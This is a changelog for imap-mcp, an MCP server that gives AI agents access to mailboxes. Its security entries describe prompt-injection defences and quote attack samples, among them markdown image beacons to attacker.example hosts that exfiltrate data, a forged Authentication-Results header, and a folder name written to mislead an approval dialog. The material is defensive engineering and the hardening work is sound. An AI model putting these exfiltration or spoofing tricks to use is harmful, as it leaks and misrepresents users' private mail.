# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

<!-- The release workflow extracts the section of the version being tagged with awk,
     matching "## [x.y.z]". Keep that heading shape exactly. -->

<!-- The docs site includes everything between these markers. Keep the end marker
     last in the file so the link definitions come along. -->
<!-- #region changelog -->

## [0.5.0] - 2026-09-07

### Added

- The server introduces itself in full. `title`, `description`, `websiteUrl` and
  `icons` now travel with `name` and `version`, so a client that shows a server
  to a person has something to show. All four were already in `server.json` for
  the registry and reached no client at all; a test compares the two so they
  cannot drift.
- An OpenSSF Scorecard run, weekly and on every push to `main`, reporting into
  the Security tab next to CodeQL and Trivy. The badge is the second in the row.

### Changed

- Source maps are no longer published in the npm tarball. Node reads them only
  under `--enable-source-maps`, which nothing here sets, and the maps pointed at
  a `src/` this package does not ship — so a stack trace under that flag named a
  file nobody could open. `dist/**/*.js` is unchanged; the package is about a
  fifth smaller.

### Fixed

- `hasAttachments` in every message summary was always `false`: the fetch
  behind `list_messages` and `list_new_messages` never asked for the body
  structure the projection reads it from. It does now.
- The two-call fallback prompt for `move_messages` in copy mode told the
  caller to call `copy_messages` again — a tool that does not exist. It names
  `move_messages`; the copy and move keys stay distinct.
- A reply to a message whose id is not shaped like a Message-ID (a control
  character, an unbounded length) is saved without an `In-Reply-To` header
  instead of failing with "must not contain line breaks".
- A connection factory that throws synchronously no longer leaves a rejected
  promise in the client that answered every later call for the life of the
  process.

### Security

- **mcp-approval 0.8.2.** A sealed dialog answer is single-use since 0.8.1: the same `requestState` presented again within its lifetime used to be accepted again, and with a resource key that is the same every time — a whole stream, a fixed set of targets — every replay landed. npm users on `^0.8.0` already had the fix; the Docker image is built from the lockfile and carried 0.8.0 until this release.
- **A refused connection is not retried for ten seconds.** Every tool call
  opened the connection lazily and a failed one was not kept, so every call
  after a refused login was another LOGIN against the provider — and "check
  IMAP_USER and IMAP_PASSWORD" is exactly the answer a model retries.
  Providers lock an account after a handful of those. The refusal is now
  answered from memory, marked as repeated and naming when the next real
  attempt is possible; the one reconnect a dropped connection is allowed does
  not clear it.
- **`list_mailboxes` is bounded on a server without LIST-STATUS.** imapflow
  falls back to one STATUS per folder there, with no ceiling, and the command
  timeout around the call does not end the commands: a namespace of a few
  thousand folders turned one listing into minutes during which no other call
  answered. The fallback now lives here — counters for the first 100
  selectable folders within a 20-second budget, the rest listed without
  counts and counted as `status_omitted`; at most 1000 folders per listing,
  with the server's total reported.
- **Sender strings beside the fence are bounded and cleaned.** The
  `Authentication-Results` authserv-id was unbounded and an attachment's
  declared content type went out as written, both into the `get_message`
  metadata block — which has its own budget and nothing array-shaped to
  shrink — so a sixty-thousand-letter header made the message unreadable
  through this server, and a hundred-kilobyte `Content-Type` did the same and
  was quoted into refusal texts the budget never measures. The id is capped
  at a hostname; a declared type that is not shaped like a media type is
  reported as `application/octet-stream` with a note that does not quote it;
  a `References` id carrying a control or invisible character is dropped;
  flags that are not atoms are cleaned and the list bounded; a declared
  attachment size that is not a safe integer (imapflow turns `1e400` into
  `Infinity`, which JSON writes as `null`) no longer fails the listing's
  output schema.
- **Configuration values are checked for shape and never echoed.**
  `ELICITATION` printed the raw value on refusal (`got "…"`), one line from
  `IMAP_PASSWORD` in every compose file. `IMAP_DOWNLOAD_DIR` went into
  `get_server_info` and every attachment listing as typed; it now has to name
  an existing directory, is stored as its real path, and the refusal says how
  long the value was. `IMAP_ATTACHMENT_TYPES` entries have to be media types
  (the refusal names the position), `IMAP_MAILBOX` and `IMAP_DRAFTS_MAILBOX`
  follow the mailbox parameter's rule, `IMAP_USER` is one line, `IMAP_HOST`
  and `IMAP_TRUSTED_AUTHSERV_ID` are bounded to a hostname, and
  `IMAP_SEEN_KEYWORD` to 64 characters.
- **`get_server_info` cleans the two lists the mail server writes.**
  Capabilities and permanent flags are answered in this server's own voice; a
  permanent flag on a shared folder is a keyword a colleague chose. Each is
  cleaned and bounded, and so is the hierarchy delimiter in every listing.
- **Error messages from the library and the runtime are bounded and escaped**
  before they reach the model. A TLS failure quotes the certificate's subject
  names, which the other end chose; a refused resource URI is quoted as a
  200-character cleaned copy.
- **Character references decode the way a mail client decodes them.** The
  decoder ran six replacements in sequence with bounded digit runs and a
  required semicolon, so `&#x26;#104;` decoded twice to an `h` no client
  shows and `&#0000000104;` stayed as eleven literal characters where the
  recipient sees an `h`. One alternation, one pass, any digit run, semicolon
  optional; zero, surrogates and values past U+10FFFF become U+FFFD as a
  browser renders them. The same in the OOXML reader.
- **Every string that leaves is well-formed UTF-16.** A cut at the result
  budget, at a paging window or at a cell cap could split a surrogate pair;
  JSON carries the half as an escape and a Python client then fails to encode
  it.
- **`npm ci --ignore-scripts` in the release workflow**, in the job that holds
  the OIDC token for npm Trusted Publishing and in the one before it — every
  dependency's install hook used to run while that token was available.
  `gh release create` verifies the tag. Pull requests run
  `dependency-review-action`, which checks the change where `npm audit` checks
  the tree.
- **The image no longer ships yarn, corepack or the lockfile.** npm was
  already removed from the runtime layer; the two package managers beside it
  and a `package-lock.json` nothing reads were not.
- **pdf.js 6.1.200, as bundled by unpdf 1.8.1, is in the range of
  CVE-2026-16633** (arbitrary JavaScript on opening a malicious PDF, fixed in
  6.2.108). The vulnerable path is the annotation layer binding a form field's
  actions to DOM events under `enableScripting`, and this server renders no
  annotation layer, no form and no DOM: it calls `getDocument`, `getPage`,
  `getTextContent`, `view` and `destroy`, and a test now holds the source to
  that set. No scanner sees the bundled copy, which SECURITY.md said would
  happen; a test pins the bundled version so the next unpdf bump revisits the
  note rather than outlives it.

## [0.4.0] - 2026-09-04

### Added

- `get_attachments` takes `mode: "text"`: the text of a PDF, Word, Excel,
  PowerPoint or OpenDocument attachment, extracted on the server and returned
  fenced as untrusted content.

  This is the only way to read a document from a client that cannot reach this
  server's filesystem — which is every remote one. `IMAP_DOWNLOAD_DIR` does not
  help there: the file lands wherever the server runs, and the result is a path
  the caller cannot open. Without it the same attachment fell through to base64
  and was refused for not fitting the result budget, which is a correct refusal
  and a useless one.

  `offset` and `max_chars` page through anything longer than one result can
  hold. The answer carries `next_offset`, `total_chars` and `returned_chars`,
  and the notes spell out the exact follow-up call. Injection signals are
  computed over the whole document rather than the window, so a payload on the
  first page still raises the banner on the call that reads the third.

  Spreadsheets come back as tab-separated values with a `== Sheet: name ==`
  heading per tab; presentations get one per slide. There is no OCR: a scan has
  no text layer, and the refusal says so and names the two ways to get the bytes
  instead of returning an empty string that reads like an empty document.

  Parsing happens in a child process with a heap limit and a timeout — a
  process rather than a worker thread, because a thread's memory limit was
  measured to fail for one allocation pattern and to keep a gigabyte resident
  after termination. In front of that boundary sit the guards that actually
  bound memory: a PDF's compressed streams are measured before PDF.js inflates
  them and refused past 32 MB for one stream or 128 MB for all of them (Flate,
  LZW and RunLength, behind an ASCII wrapper or not); a container's entries are
  bounded per entry and in total, counting only the entries the allowlist
  admits; and spreadsheet output is budgeted per row with every cell capped at
  four kilobytes, so the child never builds more than the million characters it
  may return. A document with more pages than the reader walks, or more slides,
  reports how many it declared. Word documents count the runs a reader would
  not see — hidden, white, or set at two points or smaller — the way PDFs count
  text drawn off the page, and text a tracked change deleted is not returned as
  content. `SECURITY.md` has the measurements.

- `IMAP_MAX_EXTRACT_BYTES`, default 10 MB, ceiling 64 MB. A third size limit
  because there is a third question: `IMAP_MAX_ATTACHMENT_BYTES` bounds what may
  enter the model's context, `IMAP_MAX_DOWNLOAD_BYTES` bounds what may be
  written to your disk, and this one bounds how much input a parser is handed.
  It is the one with a hard maximum, and a value above it refuses to start
  rather than being clamped: the other two buy a big answer, this one buys a
  buffer inside a parser working on bytes a stranger chose.

- Attachment listings carry `extractable`, and `get_server_info` reports
  `attachment_text_extraction`. Both exist so the option can be seen before
  anything is fetched — which matters most where `IMAP_DOWNLOAD_DIR` points
  somewhere the caller cannot reach.

### Fixed

- **One injection pattern was quadratic, and it ran in the main process.** The
  `fake-delimiter` heuristic (`---`, `===`, `###` before a word like `system`)
  backtracked once per possible length at every position of a run: 40 000
  hyphens took 1.5 s, and the million characters an extracted document may
  carry would have held the whole server — its transport is stdio — for about
  a quarter of an hour, after the parser child had exited and outside every
  timeout. A message body at its 50 000-character cap cost about two seconds
  per `get_message` in released versions. The pattern is now anchored to the
  start of a run, which makes it linear without capping the length of rule it
  recognises, and a test times every pattern on a million characters of its
  own trigger.

- **A `:` in a folder name could make two moves share one confirmation.** The
  confirmation key joined source and destination with `:`, and mailbox names
  may contain one. `("Inbox:Old" → "Archive")` and `("Inbox" → "Old:Archive")`
  produced the same key for the same messages, so a token or an accepted
  dialog for the first pair executed the second, which nobody was asked
  about. Same for a rename. Both keys now JSON-encode their names.

- An IMAP server's error text reached the model unlabelled, as if it were the
  next sentence of this server's own message. It is now introduced as the mail
  server's words, and any invisible character in it is spelled out.

- **The size limits other than `IMAP_MAX_ATTACHMENT_BYTES` did not apply.** The
  declaration check ran with the inline ceiling regardless of what the call
  asked for, and it runs before the destination is chosen — so `mode: "file"`
  could never save anything larger than the inline cap, although the code said
  it could. The policy now takes the mode. A listing, which has no mode, uses
  the widest ceiling any mode could reach for that part, so `allowed` answers
  "is this reachable at all".

- Numeric character references are decoded. `&#8217;` in HTML mail, and the
  numeric umlauts OOXML writes throughout, used to arrive as literal text.

- `</w:p>` and friends: the tag-name pattern did not match a colon, so a
  namespaced closing tag read as its prefix alone.

### Changed

- `mode: "auto"` extracts the text of a document when there is no download
  directory to save it to. With one configured it still saves, so no existing
  installation changes behaviour; the `saved` result now names `mode: "text"`
  for the case where that directory is not reachable from where the caller runs.

- Two new runtime dependencies, `unpdf` and `fflate`, both MIT and both with no
  dependencies of their own. Note that `unpdf` vendors PDF.js into its own
  bundle, so `pdfjs-dist` does not appear in this package's dependency tree and
  a PDF.js advisory raises no Dependabot, `npm audit` or Trivy alert here. An
  `unpdf` bump is a security bump; see `CONTRIBUTING.md`.

## [0.3.0] - 2026-09-03

### Added

- Every tool declares an `outputSchema` and answers with `structuredContent`
  beside the text block. A client no longer has to parse prose to use a result.

  Every tool that reports anything out of the mailbox carries `untrusted: true`
  and `source: "imap"` as fields, not only as a preamble in the text. A sender
  display name, a folder name a colleague chose and an attachment filename are
  all attacker-controllable and reach the model through the listing tools long
  before anyone opens a message, so a client that reads the structured half must
  not get them unframed. `get_server_info` and the five write tools do not carry
  it: those report this server's own configuration, or what it just did with the
  uids it was given.

  `get_message` and a text attachment keep the nonce fence in the text block;
  the structured half states the same fields rather than making a client parse
  it. An image attachment keeps its bytes in the content block, where a client
  renders them, instead of repeating the base64.

### Changed

- The advertised schemas avoid spellings that are legal JSON Schema and still
  get a tool refused, or its constraint silently dropped, by some MCP clients:
  an open object now writes `"additionalProperties": true` rather than the
  empty schema `{}` zod emits for it; a value that was left untyped is declared
  as what it really is; and a nullable field is written as `anyOf` branches
  rather than `"type": ["string", "null"]`, which several clients read as a
  single type and then drop. What the tools accept and return is unchanged;
  only the way the schema says so is.

- **Four refusals are error results rather than plain ones.** An attachment the
  policy rejects, one whose bytes are an executable whatever it declared, one
  too large to return inline, and the `manage_mailbox` rename prompt. Each read
  like an answer while being the opposite, and a tool that declares an output
  schema may not answer without `structuredContent` unless the result is an
  error.

- A result too large to shrink is an error rather than an envelope carrying the
  oversized document as a string. That envelope is valid JSON and no longer a
  valid _answer_: the SDK checks a result against the schema its tool declares.

- The two-call `confirm_token` prompt is an error result, for the same reason.
  The text is unchanged and still carries the token.

- A `confirm_token` that does not match its arguments is **refused with the
  reason** instead of being answered with a fresh prompt. The binding is
  unchanged — a confirmation issued for one set of UIDs still cannot delete
  another, and one for INBOX cannot delete from Archive — but the answer now
  says which of the two happened. The rename branch of `manage_mailbox` is
  unaffected: it uses the plain two-call token and still re-prompts.

- **`move_messages` now asks a person**, for both `move` and `copy`. It was on
  the token alone, on the grounds that a move destroys nothing, and its own
  comment already said what is wrong with that: `destination` is a free-form
  mailbox name, so on a shared account or a public namespace one call hands
  every named message to everyone who can read that folder. Disclosure is the
  part that cannot be taken back, and a token only proves the model agreed with
  itself.

  The binding is unchanged: the exact UID set and both mailboxes, with different
  keys for `move` and `copy`.

- `ELICITATION` switches the dialog off — `false` sends a client that could have
  been asked down the two-call-token path instead. For a scheduled job or a test
  harness, where a dialog is the wrong shape rather than an unwanted one.

  It does **not** remove the guard: there is no setting in which a guarded call
  goes unannounced. Two deliberate rough edges come with it. The variable is
  **not prefixed**, so one `export ELICITATION=false` reaches every MCP server in
  the environment — which is why a server started with it off prints a line
  saying so, and why the fallback text names the server instead of blaming a
  client that was working fine. And a value that is neither `true` nor `false`
  **stops the server**, like `IMAP_TLS` and unlike `IMAP_READ_ONLY`: this is the
  only variable here that defaults to _on_. It is read after `IMAP_PASSWORD` is
  wiped from the environment, so that exit cannot leave the password behind.

- A `docs/guide/approval.md` page.

- `delete_messages` and `manage_mailbox` name themselves in the fallback text
  rather than saying "call this tool again".

- Runs on **MCP SDK 2.0**. Existing clients see the same protocol revision they
  always did; the change is the package layout behind it.

- The linter is **oxlint** instead of eslint plus typescript-eslint, which lifts
  the TypeScript ceiling: typescript-eslint pins `typescript` below 6.1, so this
  repository was held on TypeScript 6 by its linter rather than by its code.

- The tool filter, the confirmation store, the approval flow and the
  documentation-asset generator now come from **`mcp-tool-allowlist`**,
  **`mcp-approval`** and **`svg-asset-set`** rather than from copies kept here
  — 1000 fewer lines. The approval flow was written in this repository and cut
  into a library once smtp-mcp had grown a near-identical copy of it; the
  behaviour is the same, with one owner. None of the packages has a runtime
  dependency of its own.

- stdio is served through `serveStdio`, so the connection's era is negotiated
  on the opening exchange rather than assumed. A client that pins the
  `2026-07-28` era is served it; until now its `server/discover` probe was
  answered with "Method not found" and only `2025-11-25` was on offer. A client
  that speaks the older era sees no change — it is still pinned to one instance
  for the life of the connection, exactly as a hand-wired
  `StdioServerTransport` served it.

### Fixed

- An entry in `IMAP_ALLOW_TOOLS` that is not tool-name-shaped is now
  **redacted** in the error rather than quoted back. `IMAP_PASSWORD` and
  `IMAP_ALLOW_TOOLS` are adjacent lines in every compose file, and a paste into
  the wrong one used to print the credential into the client's log.

### Security

- **A single mail could stop the server for half a minute.** `htmlToText` was a
  chain of regexes with bounded scan windows, and a bounded window bounds one
  factor of a product: the other is how many scans an input can start. A
  `text/html` body of `'<style '` repeated 73 000 times is 512 000 legal bytes
  that start 73 000 scans and finish none, and it measured **33 seconds** —
  Node is single-threaded and the transport is stdio, so nothing else was
  served meanwhile. The IMAP command timeout could not help; it wraps commands,
  not parsing, and its `setTimeout` cannot fire on a blocked event loop. Two
  more shapes did the same, and the tag stripper itself was scanning without
  any bound at all: `'<a '` with no `>` in the document took 57 seconds.

  The pass is now one forward walk with cursors that never rewind, plus one
  global budget for closing-tag searches — a cap on the product rather than on
  either factor. The same inputs are under 20 ms. Stripping is still best
  effort and the fence is still what carries the weight.

  The test that was supposed to catch this measured 238 ms, because its payload
  was longer than the 512 000-character input cap and the hostile half was
  sliced off before a regex saw it.

- **Folder names went to the model unsanitised.** Every other mailbox string
  goes through `sanitizeText` or `sanitizeFilename`; `list_mailboxes` returned
  `path`, `name` and `specialUse` raw, so a right-to-left override survived, and
  so did `![](https://collector.example.org/p?s=x)` — the beacon
  `defuseAutoFetch` exists to take apart, arriving through the one door without
  it. Each entry now carries a sanitised `display_name` beside the verbatim
  `path`, and a `name_warning` spelling out the difference when there is one.
  `path` stays verbatim on purpose: it is the argument the other tools take.

  The confirmation dialog shows folder names with their invisible characters
  removed and escaped beside them — `Archive` and `Archive<U+200B>` are the same
  pixels, so the gate was asking about one folder and acting on another. The
  audit log on stderr escapes them too, which is what its own comment always
  said it did. `mailboxParam` now refuses the whole C0/C1 range rather than
  `\r\n\0` alone.

- **`get_message(include_thread: true)` returned up to 2.9× the stated result
  budget.** It went out through a path that never touched `budgetedJson`, and
  fifty thread summaries with capped 2 000-character subjects and
  4 000-character address lists are 10 kB each — all sender-chosen. The metadata
  block is now budgeted to a quarter of the result with the thread list as the
  first thing dropped, and the assembled result is checked as a whole, which
  also catches the growth from defusing images and from the per-line datamarks.

- **Two entries of the executable blocklist could never match.** `extensionOf`
  read extensions with `/\.([A-Za-z0-9]{1,10})$/`, so `appref-ms` (hyphen) and
  `application` (eleven characters) both read as no extension — and no extension
  makes the check skip rather than fail. With `IMAP_DOWNLOAD_DIR` set,
  `Rechnung-2026.appref-ms` declared `application/xml` reached the disk under its
  own name with nothing noted against it; a ClickOnce manifest is valid XML, so
  the magic-byte check had nothing to object to either. A test now walks the
  whole blocklist and requires every entry to be refused.

## [0.2.0] - 2026-08-30

This is the first release published to npm, so everything below reaches a
package page for the first time — including the parts that changed weeks ago.

### Added

- **A container image** at `ghcr.io/ni-c/imap-mcp`, multi-arch (amd64 and
  arm64), built from a digest-pinned `node:24-alpine`, running as a non-root
  user, with an SBOM and build provenance. It never writes to the filesystem
  unless `IMAP_DOWNLOAD_DIR` is set, and then as uid 1000 — a bind mount has to
  be owned by that user on the host.

- **A published npm package**, `@ni-c/imap-mcp`, with provenance, released
  through GitHub Actions with npm Trusted Publishing. The unscoped name belongs
  to an unrelated project.

- README: a container badge, the architecture diagram, install snippets for
  Claude Code, Claude Desktop, Codex and Docker, and a demo recording. The
  documentation site at [imap-mcp.ni-c.de](https://imap-mcp.ni-c.de) is now
  actually served.

- `IMAP_ALLOW_TOOLS` and `IMAP_DENY_TOOLS` choose which of the eleven tools are
  registered. Both take comma-separated tool names or a prefix with a trailing
  `*`, the allow list decides what is in and the deny list is subtracted from it,
  and `IMAP_ALLOW_TOOLS=essential` selects a curated six — `list_mailboxes`,
  `list_new_messages`, `list_messages`, `get_message`, `set_message_flags` and
  `move_messages`. Four of those are read tools, so the preset stays a working
  combination under the read-only default. Nothing changes for an installation
  that sets neither.

  A filtered tool is not registered at all, so it is absent from `tools/list` and
  answers `tools/call` with "tool not found" — the same cut `IMAP_READ_ONLY`
  already makes, not a second, weaker one. It covers **tools**: the attachment
  resources are not filtered.

  An entry that matches no tool **stops the server at startup**, naming the entry
  and listing the real names. Under the read-only default, an exact write-tool
  name in the allow list is refused with a message naming `IMAP_READ_ONLY`
  instead of calling the tool unknown — which matters more here than elsewhere,
  because read-only is the default rather than something you remember switching
  on.

- A documentation site at [imap-mcp.ni-c.de](https://imap-mcp.ni-c.de), an
  architecture diagram generated from a single source, `server.json` registry
  metadata, and CI and docs workflows. The workflows ship **disabled**: this
  repository is private and its Actions minutes are worth keeping, so
  `npm run lint && npm run build && npm run test:coverage` locally is the whole
  of the verification until they are switched on.

### Changed

- **`IMAP_ALLOW_WRITE` is now `IMAP_READ_ONLY`**, for one name across the family —
  but **not** one default. Everywhere else `<PREFIX>_READ_ONLY` defaults to
  `false`; here it defaults to `true`, because the variable it replaces was
  opt-in and a rename that quietly flipped that would have handed write access to
  every installation that upgraded without reading this file. Only the literal
  string `false` turns it off, so a typo fails closed.

  An installation that still sets `IMAP_ALLOW_WRITE` **refuses to start**, with a
  message naming the replacement. Silently ignoring a removed security variable
  is worse than refusing: whoever set it once believes it is still in force.

- The SPF/DKIM/DMARC verdicts are read from the topmost
  `Authentication-Results` header only and come with the authserv-id, so a
  forged copy sitting below the receiving server's own is ignored. Whether the
  topmost one can be trusted at all is `IMAP_TRUSTED_AUTHSERV_ID`, above.
- Thread subjects and sender names in the `get_message` metadata block are now
  named as sender-chosen in its caveat, and the injection-shape detection runs
  over the metadata block too, not only over the message body.
- `get_attachments` no longer advertises `readOnlyHint: true` when
  `IMAP_DOWNLOAD_DIR` is set — with a download directory configured it can
  create files, and clients that auto-approve read-only tools should ask.
- Reference- and shortcut-style markdown images (`![alt][id]`, `![id]`) are
  defused alongside the inline form.
- The HTML-stripping passes use bounded scan windows, so crafted HTML full of
  unclosed tags can no longer burn minutes of CPU; hidden elements larger than
  the window are left to the fencing, which was always the real defence.
- A long `References` chain in a draft is folded across lines instead of
  emitting a header line beyond the RFC 5322 998-octet limit.
- Confirmation tokens are compared in constant time.
- `IMAP_HOST` no longer accepts a colon outside an IPv6 address, matching what
  the error message always said.
- The inline image result uses the allowlist-checked declared content type
  rather than the unchecked one from the download metadata.

### Security

- **The attachment resources are covered by the tool filter, and bounded by the
  inline budget.** `IMAP_DENY_TOOLS=get_attachments` removed the tool from
  `tools/list` and left `imap://message/{uid}/part/{partId}` fully live — the
  same door, still open, with the narrowing looking complete. They also read up
  to `IMAP_MAX_DOWNLOAD_BYTES` (25 MB by default) and returned it base64 in one
  JSON-RPC response; that limit exists to bound what may be written to a _file_,
  and `IMAP_MAX_ATTACHMENT_BYTES` now applies instead, as it always did for the
  tool.

- **A binary attachment requested inline is refused rather than base64-encoded
  without limit.** `textResult` applies no budget, so up to
  `IMAP_MAX_ATTACHMENT_BYTES` x 1.37 of base64 went into the model's context
  against a stated cap of 200 000 characters, scaling with a variable raised for
  an unrelated reason. Truncating would be worse than useless — half a PDF
  decodes to nothing — so the refusal names the two ways to get the bytes.

- **`get_message` checks the size of the message it received**, not just the
  size it asked for. imapflow's `maxLength` bounds the request; a compromised
  server, or anyone in the way of an `IMAP_TLS=none` connection, could stream
  more than that straight into the parser. Every attachment path already went
  through `readCapped`; this was the one that did not.

- **The `forgeable` flag on SPF/DKIM/DMARC verdicts is now honest, and there is
  `IMAP_TRUSTED_AUTHSERV_ID` to make it useful.** The old rule compared the
  header's authserv-id against the account's own domain and reported a match as
  not forgeable. A sender knows that domain — they just addressed mail to it —
  so on any account whose provider adds no `Authentication-Results` of its own,
  the sender's header was the topmost one and
  `Authentication-Results: mail.<your-domain>; spf=pass; dkim=pass; dmarc=pass`
  bought a spoofed message this server's own vouching. Nothing in a message can
  settle who wrote that header, so the operator now names the id their provider
  stamps; unset, every verdict is reported as forgeable, which is what "pass,
  says a header anyone could have written" actually means.

- **Auto-fetch markup is defused at the boundary rather than at two call sites.**
  `defuseAutoFetch` ran only where a body was rendered, so a subject, a sender
  display name, an attachment filename or a thread summary carrying
  `![](https://attacker.example/p?s=)` reached the model untouched — the same
  EchoLeak channel one layer earlier, in the field a model quotes back most
  often, and outside the fence in the metadata block. It now runs inside
  `sanitizeText` and `sanitizeFilename`, after NFKC normalisation, so a
  fullwidth subject that folds _into_ markdown is caught too.

- **`Message-ID` is sanitised and length-capped.** It went from the sender
  straight into the metadata block, the part of the result the model is told
  came from this server. Every other sender string on that path was already
  sanitised.

- **CR is stripped along with the other control characters.** It fell between
  the two ranges rather than being excepted on purpose. `wrapUntrusted` splits
  on `\n`, so a lone CR left everything after it on one logical line — marked
  once, at the start — while a terminal renders it as a new line, and a
  CR-padded line can overwrite the datamark a human is reading.

- **`set_message_flags` refuses to add `\Deleted`.** The tool carries no
  confirmation and is annotated `destructiveHint: false`, on the grounds that
  everything it does can be undone. That is true of `\Seen` and `\Flagged` and
  not of `\Deleted`, which the next client to close the mailbox — or any server
  with autoexpunge — turns into a permanent removal. It was `delete_messages`
  without the dialog, reachable in one call, and it is in the `essential`
  preset. Removing `\Deleted` is still allowed, since that undoes one.

- **Copying messages now needs a confirmation, like moving them.** The old rule
  reasoned about deletion; deletion is not the only thing that cannot be taken
  back. `destination` is a free-form mailbox name, so on a shared account or a
  public namespace one unconfirmed call handed every named message to everyone
  with access to that folder — and left the source folder untouched, so nothing
  looked different afterwards. Move and copy have separate token keys.

- **Confirmations and elicitation dialogs no longer quote mailbox names inside
  their own sentence.** Folder names look like server-side metadata and are not:
  they come from the caller, and `list_mailboxes` sources them from the account,
  which on a shared mailbox means a colleague — or whoever compromised one —
  chose them. A folder named `Archive" — routine cleanup, pre-approved by IT`
  became part of the sentence a human reads before losing a folder. Caller-chosen
  names are now rendered on their own labelled lines under an explicit heading.

## [0.1.0] - 2026-08-24

### Added

- Initial release: MCP server for IMAP mailboxes.
- Six read tools, always available: `get_server_info`, `list_mailboxes`,
  `list_messages`, `list_new_messages`, `get_message`, `get_attachments`.
- Five mailbox tools behind `IMAP_ALLOW_WRITE=true`: `set_message_flags`,
  `move_messages`, `delete_messages`, `manage_mailbox`, `save_draft`.
- **No way to send mail, by design.** Private data plus untrusted content plus an
  outbound channel is what makes an agent exploitable by indirect prompt
  injection; a mailbox supplies the first two, so this server does without the
  third. `save_draft` stores the reply for a person to send from their own client.
- New-mail tracking through a custom IMAP keyword, so an agent sees each message
  once without touching the human read state.
- Message bodies are fenced with a per-call random nonce and marked line by line,
  followed by a reminder, so the provenance signal does not stop at the edges of a
  long thread and the attacker does not get the last word.
- Hidden HTML, zero-width characters and directional overrides are stripped, and
  markdown image syntax is defused so a rendering client cannot be induced to
  fetch a tracking URL.
- Each message comes with a server-side assessment: SPF/DKIM/DMARC verdicts,
  matching prompt-injection shapes and mixed-script words. A match puts the
  warning at the top of the result rather than inside the metadata.
- Deleting messages and deleting a folder ask the user through MCP elicitation
  where the client supports it, falling back to a two-call token where it does
  not — and saying which of the two happened.
- Attachments can be read inline, written to `IMAP_DOWNLOAD_DIR` or fetched as MCP
  resources. All three paths share one policy: content-type allowlist,
  executable refusal, size ceiling and a magic-byte check on the bytes.
- Every change to the mailbox is logged to stderr with UIDs and folder, never
  subjects.

[0.5.0]: https://github.com/ni-c/imap-mcp/releases/tag/v0.5.0
[0.4.0]: https://github.com/ni-c/imap-mcp/releases/tag/v0.4.0
[0.3.0]: https://github.com/ni-c/imap-mcp/releases/tag/v0.3.0
[0.2.0]: https://github.com/ni-c/imap-mcp/releases/tag/v0.2.0
[0.1.0]: https://github.com/ni-c/imap-mcp/releases/tag/v0.1.0

<!-- #endregion changelog -->
